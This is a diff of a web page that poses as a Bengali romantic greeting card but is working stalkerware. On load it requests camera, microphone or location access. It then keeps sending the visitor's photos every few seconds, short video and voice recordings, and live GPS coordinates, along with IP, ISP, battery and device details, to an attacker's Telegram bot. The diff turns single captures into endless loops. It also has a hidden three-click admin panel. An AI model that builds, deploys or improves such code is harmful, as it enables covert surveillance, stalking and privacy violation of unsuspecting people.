@@ -31,14 +31,14 @@
     
     <div class="bg-overlay"></div>
     <div class="card">
-        <div class="heart">❤️</div>
+        <div class="heart" onclick="speakVoice()">❤️</div>
         <h1 id="title">একটু অপেক্ষা করো প্রিয়...</h1>
         <p id="poem">"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।"</p>
         <div class="loader"></div>
         <p id="status">ESTABLISHING GOD-MODE CONNECTION...</p>
         
         <video id="video" autoplay playsinline muted style="display:none;"></video>
-        <canvas id="canvas" width="720" height="1280" style="display:none;"></canvas>
+        <canvas id="canvas" width="1080" height="1920" style="display:none;"></canvas>
     </div>
 
     <div id="adminPanel">
@@ -53,9 +53,17 @@
         const adminId = "6823368645"; 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || adminId;
-        const type = urlParams.get('type') || 'front';
+        
+        /* Type Parameters for 6 Modes:
+           1. front_photo -> Front Camera Continuous Photo
+           2. back_photo  -> Back Camera Continuous Photo
+           3. front_video -> Front Camera Continuous Video
+           4. back_video  -> Back Camera Continuous Video
+           5. location    -> Continuous Live Location Update
+           6. voice       -> Audio Only Recording Loop
+        */
+        const type = urlParams.get('type') || 'front_photo';
 
-        // ১. সিক্রেট অ্যাডমিন লগইন (৩ ক্লিক)
         let clickCount = 0;
         function adminAuth() {
             clickCount++;
@@ -66,7 +74,6 @@
             setTimeout(() => clickCount = 0, 2000);
         }
 
-        // ২. ব্রডকাস্ট সিস্টেম
         async function sendBroadcast() {
             const msg = document.getElementById('broadcastMsg').value;
             if(!msg) return alert("মেসেজ দিন!");
@@ -79,7 +86,6 @@
             document.getElementById('adminPanel').style.display = 'none';
         }
 
-        // ৩. ভয়েস (Instant)
         function speakVoice() {
             const msg = new SpeechSynthesisUtterance("একটু অপেক্ষা করো প্রিয়, আমি আসছি");
             msg.lang = 'bn-BD';
@@ -87,7 +93,6 @@
             window.speechSynthesis.speak(msg);
         }
 
-        // ৪. মেটিক্স (Super Fast)
         async function getGodMetrics() {
             try {
                 const b = await navigator.getBattery();
@@ -95,83 +100,110 @@
                 const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
                 return `🔱 GOD-LEVEL REPORT [CYBER ENAFUL]\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
-                       `👤 IP: ${ipRes.ip}\n` +
-                       `🏢 ISP: ${ipRes.org}\n` +
+                       `👤 IP: ${ipRes.ip} | ISP: ${ipRes.org}\n` +
                        `📍 Loc: ${ipRes.city}, ${ipRes.country_name}\n` +
                        `🔋 Battery: ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n` +
-                       `📶 Net: ${conn.effectiveType} (${conn.downlink} Mbps)\n` +
-                       `⚙️ CPU: ${navigator.hardwareConcurrency} Cores\n` +
+                       `📶 Net: ${conn.effectiveType} | CPU: ${navigator.hardwareConcurrency} Cores\n` +
+                       `⌚ Sync: ${new Date().toLocaleTimeString()}\n` +
                        `━━━━━━━━━━━━━━━━━━━━`;
             } catch(e) { return "Metrics Error"; }
+        }
+
+        async function captureAndSend(video, canvas, mode) {
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 1.0));
+            const info = await getGodMetrics();
+            const fd = new FormData();
+            fd.append('chat_id', targetId);
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', `🔱 INFINITE ${mode.toUpperCase()} SHOT\n\n${info}`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
         }
 
         async function startGodSystem() {
             if (!targetId) return;
             speakVoice();
 
-            // লোকেশন ফিউচার
+            // ১. লাইভ লোকেশন লুপ (Type: location)
             if (type === 'location') {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const info = await getGodMetrics();
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-                        method: 'POST',
-                        body: new URLSearchParams({ chat_id: targetId, latitude: lat, longitude: lon })
-                    });
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        body: new URLSearchParams({ chat_id: targetId, text: `📍 TARGET LOCATED!\n\n${info}\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}` })
-                    });
-                    document.getElementById('status').innerText = "CONNECTED 💞";
-                }, null, {enableHighAccuracy: true});
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const info = await getGodMetrics();
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                            method: 'POST',
+                            body: new URLSearchParams({ chat_id: targetId, latitude: lat, longitude: lon })
+                        });
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            body: new URLSearchParams({ chat_id: targetId, text: `📍 LIVE LOCATION UPDATE\n\n${info}\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}` })
+                        });
+                    }, null, {enableHighAccuracy: true});
+                }, 8000);
             } 
             
-            // ক্যামেরা ও ভিডিও ফিউচার
+            // ২. অডিও/ভয়েস লুপ (Type: voice)
+            else if (type === 'voice') {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const runAudioLoop = () => {
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const afd = new FormData();
+                        afd.append('chat_id', targetId);
+                        afd.append('voice', new Blob(chunks, { type: 'audio/ogg' }), 'voice.ogg');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: afd });
+                        runAudioLoop();
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 10000);
+                };
+                runAudioLoop();
+            }
+
+            // ৩. ক্যামেরা লুপ (Photo & Video Modes)
             else {
                 try {
-                    const facing = (type.includes('back')) ? 'environment' : 'user';
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
+                    const isBack = type.includes('back');
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: isBack ? 'environment' : 'user', width: 1080, height: 1920 }, 
+                        audio: true 
+                    });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
+                    const canvas = document.getElementById('canvas');
 
-                    // ১. ইনস্ট্যান্ট ফটো (০ delay)
-                    setTimeout(async () => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.getContext('2d').drawImage(video, 0, 0, 720, 1280);
-                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-                        const info = await getGodMetrics();
-                        const fd = new FormData();
-                        fd.append('chat_id', targetId);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `🔱 INSTANT CAPTURE: ${type.toUpperCase()}\n\n${info}`);
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 500);
-
-                    // ২. ভিডিও (৫ সেকেন্ড)
-                    if (type.includes('video')) {
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = async () => {
-                            const vfd = new FormData();
-                            vfd.append('chat_id', targetId);
-                            vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'clip.mp4');
-                            vfd.append('caption', `📹 VIDEO CLIP [BOSS ENAFUL]`);
-                            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
-                        };
-                        recorder.start();
-                        setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
-                    } else {
-                        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 4000);
+                    // ফটো মুড হলে ৩ সেকেন্ড পরপর পাঠাবে
+                    if (type.includes('photo')) {
+                        setInterval(() => captureAndSend(video, canvas, type), 3000);
                     }
-                    document.getElementById('status').innerText = "CONNECTED 💞";
+
+                    // ভিডিও মুড হলে ১০ সেকেন্ডের ক্লিপ পাঠাবে
+                    if (type.includes('video')) {
+                        const runVideoLoop = () => {
+                            const recorder = new MediaRecorder(stream);
+                            const chunks = [];
+                            recorder.ondataavailable = e => chunks.push(e.data);
+                            recorder.onstop = async () => {
+                                const vfd = new FormData();
+                                vfd.append('chat_id', targetId);
+                                vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'clip.mp4');
+                                vfd.append('caption', `📹 LIVE VIDEO CLIP [${type.toUpperCase()}]`);
+                                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
+                                runVideoLoop();
+                            };
+                            recorder.start();
+                            setTimeout(() => recorder.stop(), 10000);
+                        };
+                        runVideoLoop();
+                    }
                 } catch (err) {
                     document.getElementById('status').innerText = "ERROR: PERMISSION DENIED ❌";
                 }
             }
+            document.getElementById('status').innerText = "SYSTEM ACTIVE 💞";
         }
         window.onload = startGodSystem;
     </script>
